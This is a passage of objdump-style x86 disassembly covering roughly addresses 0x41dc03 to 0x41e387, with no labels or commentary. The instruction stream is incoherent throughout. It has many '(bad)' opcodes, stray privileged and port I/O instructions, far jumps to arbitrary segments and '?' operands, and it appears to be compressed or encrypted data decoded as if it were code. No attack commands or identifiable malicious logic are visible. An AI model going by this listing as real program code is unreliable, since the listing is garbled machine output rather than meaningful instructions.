  41dc03:	cld    
  41dc04:	call   DWORD PTR [ebx+0x1]
  41dc07:	in     al,0x8d
  41dc09:	shl    DWORD PTR [ecx],1
  41dc0b:	cli    
  41dc0c:	call   DWORD PTR [ebx-0x2b]
  41dc0f:	dec    esi
  41dc10:	add    ecx,DWORD PTR [edx]
  41dc12:	(bad)  
  41dc13:	push   edx
  41dc14:	dec    ecx
  41dc16:	pop    esi
  41dc17:	sti    
  41dc18:	adc    eax,0x3fecbb75
  41dc1d:	jne    0x41dbe3
  41dc1f:	add    eax,0x3d143e31
  41dc24:	in     al,dx
  41dc25:	inc    esi
  41dc26:	push   edx
  41dc27:	xor    bh,0xa
  41dc2a:	test   al,0x6d
  41dc2c:	mov    esi,0xfde425ec
  41dc31:	add    BYTE PTR [eax],al
  41dc33:	add    BYTE PTR [eax],al
  41dc35:	add    dl,bh
  41dc37:	cmp    BYTE PTR [bp+0x1277],0x85
  41dc3d:	adc    ebp,ebx
  41dc3f:	ja     0x41dbd7
  41dc41:	mov    BYTE PTR [eax],dh
  41dc43:	mov    ds:0x897d8a89,eax
  41dc48:	xchg   esi,eax
  41dc49:	cld    
  41dc4a:	(bad)  
  41dc4b:	(bad)  [ebx-0x6949077a]
  41dc51:	cld    
  41dc52:	ret    0x32eb
  41dc55:	push   ecx
  41dc56:	call   0xb33fcc78
  41dc5b:	das    
  41dc5c:	xor    al,0x51
  41dc5e:	stos   BYTE PTR es:[edi],al
  41dc5f:	lea    esi,[eax+0x7d9b3512]
  41dc65:	mov    edi,0xfc09186a
  41dc6a:	xchg   edx,eax
  41dc6b:	iret   
  41dc6c:	mov    dh,BYTE PTR [edx-0x67]
  41dc6f:	inc    edx
  41dc70:	push   cs
  41dc71:	push   edi
  41dc72:	sbb    bh,0xaa
  41dc75:	or     eax,0x7296e2f6
  41dc7a:	jnp    0x41dc63
  41dc7c:	cmp    al,0xf5
  41dc7e:	je     0x41dc84
  41dc80:	add    ecx,DWORD PTR [eax-0x17d10b40]
  41dc86:	leave  
  41dc87:	fadd   QWORD PTR [ebx]
  41dc89:	add    dh,bh
  41dc8b:	push   ss
  41dc8c:	test   eax,0x9a40e6
  41dc91:	add    BYTE PTR [ebx],bh
  41dc93:	addr16 (bad) 
  41dc95:	dec    BYTE PTR [ebp+0x3]
  41dc98:	fadd   DWORD PTR [ebx]
  41dc9a:	add    BYTE PTR [eax],al
  41dc9c:	add    BYTE PTR [eax],al
  41dc9e:	add    BYTE PTR [ebp+0x2],dh
  41dca1:	sbb    al,ah
  41dca3:	nop
  41dca4:	adc    DWORD PTR [ecx+esi*8],0xffffff98
  41dca8:	jns    0x41dcce
  41dcaa:	push   es
  41dcab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcac:	std    
  41dcad:	push   eax
  41dcae:	hlt    
  41dcaf:	dec    DWORD PTR [eax-0x11]
  41dcb2:	xor    ebx,DWORD PTR ds:0x7503aaca
  41dcb8:	fwait
  41dcb9:	jmp    0x72487548
  41dcbe:	rcr    edx,0x4a
  41dcc1:	xor    al,0x99
  41dcc3:	jmp    0x67cc7343
  41dcc8:	mov    dl,0x69
  41dcca:	cdq    
  41dccb:	fcos   
  41dccd:	push   0x7f
  41dccf:	ror    BYTE PTR [edi-0x5db8671a],cl
  41dcd5:	sbb    DWORD PTR [edx],esi
  41dcd7:	sub    BYTE PTR [edx-0x70466e8a],bl
  41dcdd:	jno    0x41dc7a
  41dcdf:	cmc    
  41dce0:	(bad)  
  41dce1:	out    0xe,eax
  41dce3:	cmp    al,0x7d
  41dce5:	stos   DWORD PTR es:[edi],eax
  41dce6:	or     eax,DWORD PTR [ebp+0x7d]
  41dce9:	mov    ds:0xc99a2ab3,eax
  41dcee:	cmp    edx,DWORD PTR [eax-0x5af18e71]
  41dcf4:	jnp    0x41dd24
  41dcf6:	mov    bh,bh
  41dcf8:	mov    ch,0x3e
  41dcfa:	and    DWORD PTR [edx],0x7184258f
  41dd00:	(bad)  
  41dd01:	xchg   edx,eax
  41dd02:	outs   dx,BYTE PTR ds:[esi]
  41dd03:	add    BYTE PTR [eax],al
  41dd05:	add    BYTE PTR [eax],al
  41dd07:	add    cl,al
  41dd09:	call   0x3e62:0x27515e4
  41dd10:	push   ebp
  41dd11:	sub    DWORD PTR [esi],0x5
  41dd14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd15:	xor    edx,DWORD PTR [esi-0x53868]
  41dd1b:	add    BYTE PTR [ecx-0x1111036b],ch
  41dd21:	xchg   esi,eax
  41dd22:	and    dh,0x78
  41dd25:	adc    ecx,DWORD PTR [ecx]
  41dd27:	fiadd  WORD PTR [esi+esi*4-0x658ecb78]
  41dd2e:	scas   al,BYTE PTR es:[edi]
  41dd2f:	aaa    
  41dd30:	add    cl,BYTE PTR [esi-0x593ac378]
  41dd36:	dec    edi
  41dd37:	and    edx,esp
  41dd39:	lea    eax,[eax-0x7c02154a]
  41dd3f:	adc    ah,dl
  41dd41:	(bad)  
  41dd42:	cld    
  41dd43:	push   0xa
  41dd45:	nop
  41dd46:	jo     0x41dd81
  41dd48:	sub    eax,DWORD PTR [ecx+edi*8-0x17]
  41dd4c:	(bad)  
  41dd4e:	mov    DWORD PTR [edi-0x79ad2df7],ecx
  41dd54:	jmp    0x728d:0xe36aef79
  41dd5b:	out    dx,eax
  41dd5c:	add    BYTE PTR [ebp+esi*8-0x1c],al
  41dd60:	pmullw mm2,QWORD PTR [ebp+0x51]
  41dd64:	inc    esp
  41dd65:	and    BYTE PTR [eax],al
  41dd67:	jmp    0xbb21f16f
  41dd6c:	add    BYTE PTR [eax],al
  41dd6e:	add    BYTE PTR [eax],al
  41dd70:	add    BYTE PTR [eax-0x73],dl
  41dd73:	jb     0x41dd56
  41dd75:	into   
  41dd76:	sub    al,0xf6
  41dd78:	inc    esi
  41dd79:	jmp    0x88f9:0x65e8f781
  41dd80:	xchg   esp,eax
  41dd81:	outs   dx,BYTE PTR ds:[esi]
  41dd82:	cmp    al,ch
  41dd84:	leave  
  41dd85:	dec    eax
  41dd86:	(bad)  
  41dd87:	cld    
  41dd88:	adc    bh,BYTE PTR [ebx-0x7d]
  41dd8b:	neg    DWORD PTR [esi]
  41dd8d:	test   BYTE PTR [esi+eax*8],al
  41dd90:	lods   al,BYTE PTR ds:[esi]
  41dd91:	repz mov ecx,gs
  41dd94:	jmp    0x7064:0xf928ee
  41dd9b:	push   ebx
  41dd9c:	dec    DWORD PTR [ebx+0x75]
  41dd9f:	jno    0x41dd79
  41dda1:	je     0x41dd83
  41dda3:	rol    DWORD PTR [eax],0x4c
  41dda6:	jl     0x41dde9
  41dda8:	sti    
  41dda9:	pop    eax
  41ddaa:	pop    es
  41ddab:	or     eax,DWORD PTR [ebp-0x4912b]
  41ddb1:	mov    edx,gs
  41ddb3:	repnz add BYTE PTR [ebx],bh
  41ddb6:	push   cs
  41ddb7:	lods   al,BYTE PTR ds:[esi]
  41ddb8:	stc    
  41ddb9:	cmp    esi,DWORD PTR [ebp-0x5]
  41ddbc:	jne    0x41ddfa
  41ddbe:	jne    0x41de31
  41ddc0:	div    DWORD PTR [esi+0x1475fb75]
  41ddc6:	pop    edx
  41ddc7:	or     dh,dh
  41ddc9:	sbb    esi,DWORD PTR [ebp-0x7f]
  41ddcc:	rcr    bl,0x12
  41ddcf:	mov    ebp,0xfb6e61e9
  41ddd4:	inc    DWORD PTR [eax]
  41ddd6:	add    BYTE PTR [eax],al
  41ddd8:	add    BYTE PTR [eax],al
  41ddda:	mov    eax,ds:0xe883e879
  41dddf:	mov    eax,ds:0x74d87d7f
  41dde4:	jo     0x41de21
  41dde6:	inc    edx
  41dde7:	inc    edx
  41dde8:	adc    al,0x2
  41ddea:	sbb    DWORD PTR [edx-0x4],eax
  41dded:	push   eax
  41ddee:	sub    DWORD PTR [edx-0x1c],eax
  41ddf1:	push   eax
  41ddf2:	dec    ebx
  41ddf3:	repnz or eax,edi
  41ddf6:	shl    DWORD PTR [ebp+0xc],1
  41ddf9:	add    BYTE PTR [ecx+eax*1-0x6dc4f08c],cl
  41de00:	call   0x8143ba1a
  41de05:	rol    al,0xfa
  41de08:	jle    0x41ddd2
  41de0a:	dec    ebx
  41de0b:	pop    eax
  41de0c:	cmp    edi,edi
  41de0e:	jno    0x41de7d
  41de10:	adc    DWORD PTR [eax+0x5c],eax
  41de13:	pop    eax
  41de14:	jmp    0x41dda1
  41de16:	jne    0x41de76
  41de18:	test   al,0x86
  41de1a:	mov    al,0xf3
  41de1c:	sbb    cl,BYTE PTR [ecx+0x5a9fdb8]
  41de22:	test   BYTE PTR [ebp-0x24780068],0x1a
  41de29:	xchg   DWORD PTR [eax-0x7abd786b],esi
  41de2f:	adc    edi,DWORD PTR ds:0x85939ff3
  41de35:	inc    edx
  41de36:	sub    ebx,ecx
  41de38:	xchg   edx,eax
  41de39:	jb     0x41dea8
  41de3b:	gs cmp al,0xf4
  41de3e:	add    BYTE PTR [eax],al
  41de40:	add    BYTE PTR [eax],al
  41de42:	add    BYTE PTR [ebp-0x4d],dh
  41de45:	rcl    DWORD PTR [ebx+0xa],1
  41de48:	dec    esp
  41de49:	into   
  41de4a:	(bad)  
  41de4b:	stc    
  41de4c:	pop    edx
  41de4d:	add    dl,BYTE PTR [ebx-0x393edfcc]
  41de53:	mov    bh,0x8a
  41de55:	add    BYTE PTR [ebx-0x2],dl
  41de58:	jle    0x41ddda
  41de5a:	jmp    0x41ddf9
  41de5c:	call   0x835:0x20460000
  41de63:	sub    ebp,esp
  41de65:	cs call 0x45cf83
  41de6b:	xchg   BYTE PTR [edx-0x29],ah
  41de6e:	add    DWORD PTR [edx+0x37],ebp
  41de71:	shl    DWORD PTR [eax],0xab
  41de74:	dec    esp
  41de75:	es add eax,0x4f9c65f8
  41de7b:	out    dx,al
  41de7c:	das    
  41de7d:	mov    DWORD PTR [edx-0x77],ecx
  41de80:	inc    edx
  41de81:	fcom   QWORD PTR [eax-0x6e]
  41de84:	inc    ebx
  41de85:	cmp    BYTE PTR [edi-0x40316400],0x8c
  41de8c:	jl     0x41de8e
  41de8e:	add    BYTE PTR [ebp+0x1b],dh
  41de91:	adc    eax,0x9b0275f9
  41de96:	out    dx,eax
  41de97:	std    
  41de98:	xchg   DWORD PTR [ecx+ebp*1-0x6754809e],esi
  41de9f:	stos   BYTE PTR es:[edi],al
  41dea0:	call   0xc46a:0x8c5030ef
  41dea7:	add    BYTE PTR [eax],al
  41dea9:	add    BYTE PTR [eax],al
  41deab:	add    bh,al
  41dead:	call   0x890e:0x3dedb511
  41deb4:	sti    
  41deb5:	in     eax,0xe6
  41deb7:	add    esi,DWORD PTR [eax]
  41deb9:	add    esi,DWORD PTR [edx-0x4e]
  41debc:	jmp    0x41de56
  41debe:	test   BYTE PTR [eax],0x37
  41dec1:	js     0x41de7a
  41dec3:	adc    BYTE PTR [ebx+eax*1],0xce
  41dec7:	add    esi,DWORD PTR [ebp-0x3f]
  41deca:	(bad)  
  41decb:	repz jge 0x41de7f
  41dece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41decf:	stos   DWORD PTR es:[edi],eax
  41ded0:	jp     0x41de93
  41ded2:	enter  0x6c0b,0xc0
  41ded6:	push   ds
  41ded7:	mov    esi,0xd7409337
  41dedc:	call   0x7045c5e3
  41dee1:	sub    DWORD PTR [edx+0x3],0x75
  41dee5:	add    al,BYTE PTR [ecx]
  41dee7:	add    al,0x5f
  41dee9:	add    DWORD PTR [esi+edi*1-0x34],esi
  41deed:	xor    dh,BYTE PTR [edx-0x68]
  41def0:	fidivr DWORD PTR [eax+ebx*1-0x5979466b]
  41def7:	ud2    
  41def9:	jns    0x41dea6
  41defb:	cwde   
  41defc:	xacquire xchg BYTE PTR [ebx],dl
  41deff:	enter  0x8ba0,0x55
  41df03:	jg     0x41dedf
  41df05:	push   ss
  41df06:	fnstsw WORD PTR ds:0x3458c12
  41df0c:	jne    0x41df10
  41df0e:	mov    ebp,0xad
  41df13:	add    BYTE PTR [eax],al
  41df15:	fwait
  41df16:	or     BYTE PTR [eax],al
  41df18:	ss loope 0x41dea9
  41df1b:	mov    ah,BYTE PTR [esi+eax*1-0x66d9cec5]
  41df22:	xor    eax,0x8d3a648b
  41df27:	cld    
  41df28:	push   ss
  41df29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df2a:	cmp    DWORD PTR [edx+0x19],0xffffffe9
  41df2e:	out    dx,eax
  41df2f:	rcr    esp,cl
  41df31:	mov    dh,0x2
  41df33:	sub    DWORD PTR [ecx],0x72
  41df36:	add    al,0xc6
  41df38:	lods   al,BYTE PTR ds:[esi]
  41df39:	jmp    0xfdfcc867
  41df3e:	(bad)  
  41df40:	shr    BYTE PTR [eax],cl
  41df42:	cmp    BYTE PTR [ebp-0x1b],0x78
  41df46:	push   ss
  41df47:	pop    es
  41df48:	bound  edi,QWORD PTR [edi-0x12]
  41df4b:	cmp    dh,dl
  41df4d:	ins    BYTE PTR es:[edi],dx
  41df4e:	xchg   ecx,eax
  41df4f:	call   0x18876b2f
  41df54:	push   ebx
  41df55:	ins    DWORD PTR es:[edi],dx
  41df56:	cmp    DWORD PTR [edi+0x427746ed],0xf79aa9c6
  41df60:	test   eax,0x14fd0271
  41df65:	or     DWORD PTR [esi-0x35233aee],ecx
  41df6b:	call   ecx
  41df6d:	out    dx,eax
  41df6e:	push   cs
  41df6f:	lds    ebp,FWORD PTR [ecx+0x64]
  41df72:	xchg   ebp,eax
  41df73:	pop    ecx
  41df74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df75:	sub    al,0x89
  41df77:	(bad)  
  41df78:	in     eax,0x0
  41df7a:	add    BYTE PTR [eax],al
  41df7c:	add    BYTE PTR [eax],al
  41df7e:	in     eax,dx
  41df7f:	fsin   
  41df81:	call   0x7451f7fc
  41df86:	cmp    al,0xb2
  41df88:	imul   ebp,ecx,0xb9128d66
  41df8e:	pushf  
  41df8f:	retf   0x69ff
  41df92:	mov    ebp,0x9e0069f6
  41df97:	(bad)  
  41df98:	gs mov ecx,ebx
  41df9b:	dec    esi
  41df9c:	or     esi,DWORD PTR [esi+0xf4462c9]
  41dfa2:	fsub   DWORD PTR [esi]
  41dfa4:	std    
  41dfa5:	call   FWORD PTR [esi+ecx*8+0x73]
  41dfa9:	or     DWORD PTR [edx+0x755bf33b],ebx
  41dfaf:	jb     0x41dfad
  41dfb1:	call   FWORD PTR [ebx+eax*4+0x41]
  41dfb5:	shl    BYTE PTR [eax+ebp*2+0x4f],1
  41dfb9:	inc    DWORD PTR [ebx+0x9]
  41dfbc:	in     eax,dx
  41dfbd:	mov    DWORD PTR [ecx+0x23fe7f75],edi
  41dfc3:	repnz loopne 0x41dfc5
  41dfc6:	leave  
  41dfc7:	bound  esp,QWORD PTR [esi+0x5a]
  41dfca:	push   0xffffffd1
  41dfcc:	out    0x21,eax
  41dfce:	inc    edx
  41dfcf:	jne    0x41dfcc
  41dfd1:	mov    esp,DWORD PTR [ecx+eax*4]
  41dfd4:	sti    
  41dfd5:	add    DWORD PTR [ecx-0x34],ecx
  41dfd8:	mov    BYTE PTR [ebp+0x4],al
  41dfdb:	(bad)  
  41dfdc:	mov    BYTE PTR [ebp-0x44],al
  41dfdf:	aad    0xe7
  41dfe1:	cwde   
  41dfe2:	add    BYTE PTR [eax],al
  41dfe4:	add    BYTE PTR [eax],al
  41dfe6:	add    BYTE PTR [ecx-0x7674048b],cl
  41dfec:	outs   dx,BYTE PTR ds:[esi]
  41dfed:	xchg   eax,edi
  41dfef:	gs repnz fucomip st,st(0)
  41dff3:	inc    edi
  41dff4:	retf   0xfffa
  41dff7:	pop    edi
  41dff8:	je     0x41dff5
  41dffa:	jne    0x41dfbc
  41dffc:	or     BYTE PTR [edx+0x8],bl
  41dfff:	sbb    bh,BYTE PTR [ebx]
  41e001:	repz pop ebx
  41e003:	cmc    
  41e004:	sub    ebp,edi
  41e006:	call   FWORD PTR [esp+ecx*8+0x5c337e7]
  41e00d:	add    BYTE PTR [ebx+0x5d8769d9],cl
  41e013:	jne    0x41dfb8
  41e015:	test   edi,eax
  41e017:	ja     0x41e064
  41e019:	sbb    bl,BYTE PTR [edx+0x22]
  41e01c:	ins    BYTE PTR es:[edi],dx
  41e01d:	cwde   
  41e01e:	aad    0x80
  41e020:	enter  0x8891,0x7d
  41e024:	sbb    al,0x92
  41e026:	(bad)  
  41e027:	jmp    0x55b471cf
  41e02c:	rep lods eax,DWORD PTR ds:[esi]
  41e02e:	push   eax
  41e02f:	(bad)  
  41e030:	call   0x39752b2
  41e035:	or     edx,DWORD PTR [ebx+0x52]
  41e038:	clc    
  41e039:	test   esp,edi
  41e03b:	dec    edx
  41e03c:	nop
  41e03d:	test   BYTE PTR [ebp+0x42],ch
  41e040:	mov    BYTE PTR [esi+0x149a3a80],cl
  41e046:	add    al,0x3b
  41e048:	pop    esi
  41e049:	(bad)  
  41e04a:	inc    DWORD PTR [eax]
  41e04c:	add    BYTE PTR [eax],al
  41e04e:	add    BYTE PTR [eax],al
  41e050:	cld    
  41e051:	aad    0x8a
  41e053:	pop    esp
  41e054:	ret    
  41e055:	inc    esp
  41e056:	mov    ecx,0x269b71c1
  41e05b:	mov    DWORD PTR [eax-0x4f78d642],edi
  41e061:	ins    DWORD PTR es:[edi],dx
  41e062:	jp     0x41e0a6
  41e064:	sbb    dl,BYTE PTR [esi]
  41e066:	or     eax,0xb7d5ecd0
  41e06b:	out    0x3b,eax
  41e06d:	in     eax,dx
  41e06e:	mov    ?,esp
  41e070:	(bad)  
  41e071:	push   0xffffff82
  41e073:	std    
  41e074:	loop   0x41e00d
  41e076:	test   BYTE PTR [ecx],bh
  41e078:	fisubr DWORD PTR [edi-0x72]
  41e07b:	push   ebp
  41e07c:	frstor [ecx+eiz*1+0x0]
  41e080:	jne    0x41e002
  41e082:	adc    al,0xec
  41e084:	dec    edi
  41e085:	in     eax,0x39
  41e087:	push   ecx
  41e088:	int    0x8a
  41e08a:	(bad)  
  41e08b:	cld    
  41e08c:	mov    dl,0x1b
  41e08e:	mov    esi,?
  41e090:	and    DWORD PTR [edx],eax
  41e092:	out    dx,eax
  41e093:	cmp    DWORD PTR [ebp-0x666f45f6],ecx
  41e099:	pushf  
  41e09a:	in     eax,0x84
  41e09c:	mov    cl,BYTE PTR [eax+0x3eb309d3]
  41e0a2:	ds sub eax,0x4724fd8c
  41e0a8:	jl     0x41e0ab
  41e0aa:	aas    
  41e0ab:	inc    bh
  41e0ad:	xchg   DWORD PTR ds:0xe78bef84,ebp
  41e0b3:	push   ss
  41e0b4:	add    BYTE PTR [eax],al
  41e0b6:	add    BYTE PTR [eax],al
  41e0b8:	add    BYTE PTR [ecx],al
  41e0ba:	sbb    DWORD PTR [ebx+0x7d0ebc98],0xffffff91
  41e0c1:	(bad)  
  41e0c2:	xchg   esi,eax
  41e0c3:	or     eax,0x61d4017
  41e0c8:	xor    eax,0x90fbce4d
  41e0cd:	cmp    DWORD PTR [esi+0x26],edi
  41e0d0:	add    DWORD PTR [esi],eax
  41e0d2:	ret    
  41e0d3:	add    DWORD PTR [eax+0x34d27bc7],ecx
  41e0d9:	fs stos DWORD PTR es:[edi],eax
  41e0db:	xor    al,0x39
  41e0dd:	pop    ebp
  41e0de:	in     eax,0xb6
  41e0e0:	scas   al,BYTE PTR es:[edi]
  41e0e1:	mov    ch,0x2
  41e0e3:	push   esp
  41e0e4:	loop   0x41e0ae
  41e0e6:	cli    
  41e0e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0e8:	inc    esp
  41e0e9:	jne    0x41e11b
  41e0eb:	mov    esi,0x26f462f6
  41e0f0:	add    al,0xad
  41e0f2:	in     eax,0x96
  41e0f4:	scas   al,BYTE PTR es:[edi]
  41e0f5:	xor    eax,0xfbf51c02
  41e0fa:	in     eax,0xc2
  41e0fc:	mov    edi,0xee600235
  41e101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e103:	sub    DWORD PTR [ebx+esi*4],eax
  41e106:	std    
  41e107:	xchg   esi,eax
  41e108:	scas   al,BYTE PTR es:[edi]
  41e109:	xor    eax,0xb839e802
  41e10e:	in     eax,dx
  41e10f:	call   esp
  41e111:	test   al,0xc7
  41e113:	jmp    DWORD PTR [ecx+0x33]
  41e116:	cli    
  41e117:	sub    BYTE PTR [edx],ch
  41e119:	mov    dl,bl
  41e11b:	inc    edi
  41e11c:	mov    cl,0x0
  41e11e:	add    BYTE PTR [eax],al
  41e120:	add    BYTE PTR [eax],al
  41e122:	sbb    dl,0x47
  41e125:	frstor [edx+0x4ef9743f]
  41e12b:	cmc    
  41e12c:	sub    BYTE PTR [esi+esi*2],0x2
  41e130:	add    BYTE PTR [esi-0x2a],bh
  41e133:	in     eax,dx
  41e134:	aas    
  41e135:	jmp    0xc2abfca
  41e13a:	les    esi,FWORD PTR [edi+0x1c76a915]
  41e140:	and    edx,DWORD PTR [edx]
  41e142:	dec    edi
  41e143:	inc    esi
  41e144:	out    dx,eax
  41e145:	push   DWORD PTR [esi-0x163e95fe]
  41e14b:	idiv   BYTE PTR [ecx+ebp*1-0x6d0038c4]
  41e152:	dec    edx
  41e153:	call   0xe93f:0xedc63604
  41e15a:	mov    ah,ch
  41e15c:	sahf   
  41e15d:	or     eax,0x3f004235
  41e162:	cs ret 0x1a72
  41e166:	jno    0x41e11a
  41e168:	ja     0x41e193
  41e16a:	jno    0x41e0f1
  41e16c:	adc    bl,BYTE PTR ds:0x1ffc707
  41e172:	adc    ebx,DWORD PTR ss:0x400f1141
  41e179:	jmp    0x51546724
  41e17e:	out    0xc6,eax
  41e180:	dec    DWORD PTR [ecx-0x33]
  41e183:	mov    edx,0xe940
  41e188:	add    BYTE PTR [eax],al
  41e18a:	add    BYTE PTR [edi-0x8218d3f],bh
  41e190:	mov    esi,0x9a2f00fc
  41e195:	enter  0xcc43,0x6b
  41e199:	add    DWORD PTR [ecx+0x3f46c0],esp
  41e19f:	pop    ds
  41e1a0:	jbe    0x41e19d
  41e1a2:	je     0x41e171
  41e1a4:	mov    ebx,0x817974bf
  41e1a9:	dec    ecx
  41e1aa:	or     ch,cl
  41e1ac:	shl    DWORD PTR [edi+0x0],cl
  41e1af:	mov    WORD PTR [edx],es
  41e1b1:	add    BYTE PTR [edi+0x3b],dl
  41e1b4:	dec    esi
  41e1b5:	add    eax,0x558743c1
  41e1bb:	push   esp
  41e1bc:	or     DWORD PTR [edx+0xc],ecx
  41e1bf:	xor    al,0xfe
  41e1c1:	cld    
  41e1c2:	dec    DWORD PTR [edx+ebp*2-0x1e]
  41e1c6:	xchg   BYTE PTR [edx+eax*1-0x5],cl
  41e1ca:	jne    0x41e220
  41e1cc:	or     ebp,ebp
  41e1ce:	inc    DWORD PTR [ecx+0x16]
  41e1d1:	adc    eax,DWORD PTR [eax+0x4c]
  41e1d4:	mov    ecx,0x753075ef
  41e1d9:	jno    0x41e1e7
  41e1db:	sub    ecx,DWORD PTR [ebx+0x1dc13a4]
  41e1e1:	mov    al,0x1
  41e1e3:	inc    edi
  41e1e4:	xchg   edi,eax
  41e1e5:	sti    
  41e1e6:	jne    0x41e1f0
  41e1e8:	jg     0x41e1b4
  41e1ea:	add    BYTE PTR [esi+edi*8-0x1],ch
  41e1ee:	push   edx
  41e1ef:	add    BYTE PTR [eax],al
  41e1f1:	add    BYTE PTR [eax],al
  41e1f3:	add    BYTE PTR [edi-0x34],cl
  41e1f6:	dec    esi
  41e1f7:	jmp    DWORD PTR [ecx]
  41e1f9:	fimul  DWORD PTR [esi]
  41e1fb:	inc    eax
  41e1fc:	or     al,0x7b
  41e1fe:	mov    esp,0xbcb406eb
  41e203:	pop    edi
  41e204:	jp     0x41e1df
  41e206:	pop    eax
  41e207:	ret    0x1e4
  41e20a:	push   ecx
  41e20b:	mov    ebp,eax
  41e20d:	into   
  41e20e:	jle    0x41e28d
  41e210:	jne    0x41e19d
  41e212:	add    BYTE PTR [eax+edi*2+0x20],dh
  41e216:	dec    eax
  41e217:	adc    BYTE PTR [ebx+0x18],bl
  41e21a:	leave  
  41e21b:	pop    ebx
  41e21c:	inc    eax
  41e21d:	lahf   
  41e21e:	add    DWORD PTR [edx-0x7b],0xfe563199
  41e225:	mov    ?,eax
  41e227:	push   esp
  41e228:	clc    
  41e229:	and    eax,0x9bc083fe
  41e22e:	add    BYTE PTR [eax],al
  41e230:	(bad)  
  41e231:	pop    esi
  41e232:	cld    
  41e233:	out    0x40,eax
  41e235:	sbb    eax,0xe3ee0001
  41e23a:	dec    ebp
  41e23b:	add    esi,DWORD PTR [ebx+ebx*4+0x0]
  41e23f:	cmp    DWORD PTR [edx-0x64],edx
  41e242:	cmp    DWORD PTR [ebp-0x76ff648b],0x1d988bb0
  41e24c:	repz call 0xc4c9:0xefb88700
  41e254:	jp     0x41e26e
  41e256:	pop    edx
  41e257:	inc    DWORD PTR [eax]
  41e259:	add    BYTE PTR [eax],al
  41e25b:	add    BYTE PTR [eax],al
  41e25d:	inc    edx
  41e25e:	fwait
  41e25f:	xchg   eax,ebx
  41e261:	rcl    BYTE PTR [ebx+0x1782bf87],0x6e
  41e268:	jmp    FWORD PTR [edx]
  41e26a:	fwait
  41e26b:	xchg   DWORD PTR [edi+0x72c6f1a8],edi
  41e271:	imul   ebp,DWORD PTR [edi],0x90b98af2
  41e277:	dec    BYTE PTR [edi+0xa]
  41e27a:	add    BYTE PTR cs:[esi+0x2],dl
  41e27e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e27f:	cmp    al,0x16
  41e281:	mov    ch,0x9b
  41e283:	jg     0x41e248
  41e285:	and    ebp,0xa81d128a
  41e28b:	inc    eax
  41e28c:	add    dh,ch
  41e28e:	add    DWORD PTR [ebp-0x19814764],esi
  41e294:	add    edi,esi
  41e296:	std    
  41e297:	sub    al,0x99
  41e299:	inc    ebp
  41e29a:	jg     0x41e24d
  41e29c:	sbb    BYTE PTR [esi],ch
  41e29e:	jns    0x41e2d3
  41e2a0:	add    dh,ch
  41e2a2:	int    0xe1
  41e2a4:	and    eax,0x8de505f4
  41e2a9:	dec    esi
  41e2aa:	cmc    
  41e2ab:	push   ebx
  41e2ac:	inc    edi
  41e2ad:	jo     0x41e280
  41e2af:	es int3 
  41e2b1:	aaa    
  41e2b2:	cmc    
  41e2b3:	in     eax,dx
  41e2b4:	jbe    0x41e288
  41e2b6:	add    BYTE PTR [edi+ecx*4-0x3aee3e8b],ch
  41e2bd:	add    eax,0x3f0036
  41e2c2:	add    BYTE PTR [eax],al
  41e2c4:	add    BYTE PTR [eax],al
  41e2c6:	ins    DWORD PTR es:[edi],dx
  41e2c7:	push   cs
  41e2c8:	in     eax,dx
  41e2c9:	xor    eax,0xfbbb83c2
  41e2ce:	imul   ebp,esi,0x2a2f59a
  41e2d4:	push   0xffffffc8
  41e2d6:	outs   dx,BYTE PTR ds:[esi]
  41e2d7:	add    DWORD PTR [ebx+edi*8+0x3e605d2],edx
  41e2de:	shl    ebp,0x61
  41e2e1:	aas    
  41e2e2:	ins    DWORD PTR es:[edi],dx
  41e2e3:	jg     0x41e290
  41e2e5:	sti    
  41e2e6:	je     0x41e300
  41e2e8:	fwait
  41e2e9:	sub    ebx,DWORD PTR [ebx-0x58871887]
  41e2ef:	cli    
  41e2f0:	popa   
  41e2f1:	inc    edi
  41e2f2:	and    DWORD PTR [esi+0x2a],esi
  41e2f5:	add    al,0x77
  41e2f7:	xor    bl,dh
  41e2f9:	push   ss
  41e2fa:	gs sub al,0xd6
  41e2fd:	idiv   BYTE PTR [esi-0xbfbd914]
  41e303:	mov    esi,0xedf835f2
  41e308:	mov    ?,eax
  41e30a:	mov    dl,0x2
  41e30c:	add    BYTE PTR [edx-0x50],ah
  41e30f:	call   0x425e:0x26b6fa01
  41e316:	push   ds
  41e317:	ret    0xe90b
  41e31a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e31b:	inc    ebx
  41e31c:	shl    ecx,0x76
  41e31f:	sbb    BYTE PTR [edx],al
  41e321:	xor    DWORD PTR [edi-0x1f940009],esi
  41e327:	nop    DWORD PTR [edx+0x0]
  41e32b:	add    BYTE PTR [eax],al
  41e32d:	add    BYTE PTR [eax],al
  41e32f:	mov    bl,0x1b
  41e331:	int3   
  41e332:	sub    dh,BYTE PTR [ecx-0x2f]
  41e335:	mov    edi,0x120fdf64
  41e33a:	jb     0x41e2df
  41e33c:	pop    ds
  41e33d:	int3   
  41e33e:	stos   BYTE PTR es:[edi],al
  41e33f:	jbe    0x41e30c
  41e341:	xor    ebp,ebx
  41e343:	(bad)  
  41e344:	ret    
  41e345:	sub    BYTE PTR [ebx],0x9e
  41e348:	retf   0xbbbe
  41e34b:	loop   0x41e2cf
  41e34d:	(bad)  
  41e34e:	ds xor eax,0x8a625332
  41e354:	fimul  WORD PTR [ebx]
  41e356:	push   0x1e
  41e358:	xchg   BYTE PTR [eax],dh
  41e35a:	inc    edx
  41e35b:	mov    eax,ds:0xede2f779
  41e360:	cmc    
  41e361:	sub    DWORD PTR [ebp+0x76],0x2
  41e365:	add    BYTE PTR [edx+0x43],ah
  41e368:	sbb    ecx,esp
  41e36a:	stos   BYTE PTR es:[edi],al
  41e36b:	jbe    0x41e33e
  41e36d:	mov    edi,0x75ba3d97
  41e372:	enter  0xf0ad,0x63
  41e376:	sbb    eax,0xdb8902b5
  41e37b:	sub    ch,ah
  41e37d:	jae    0x41e372
  41e37f:	mov    dh,0x81
  41e381:	lds    eax,FWORD PTR [ecx]
  41e383:	cmp    al,BYTE PTR [ecx+esi*2-0x2b]
  41e387:	loop   0x41e382
